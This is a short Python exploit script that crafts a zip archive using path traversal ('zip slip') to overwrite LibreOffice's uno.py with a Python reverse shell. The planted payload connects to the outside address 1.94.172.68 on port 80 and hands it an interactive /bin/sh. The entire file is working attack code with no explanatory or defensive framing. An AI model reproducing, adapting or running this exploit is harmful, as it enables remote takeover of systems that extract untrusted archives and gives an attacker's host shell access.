import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'whoami'
        binary2 = b'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("1.94.172.68",80));os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])\n'
        zipFile = zipfile.ZipFile("exp.zip", "a", zipfile.ZIP_DEFLATED)
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e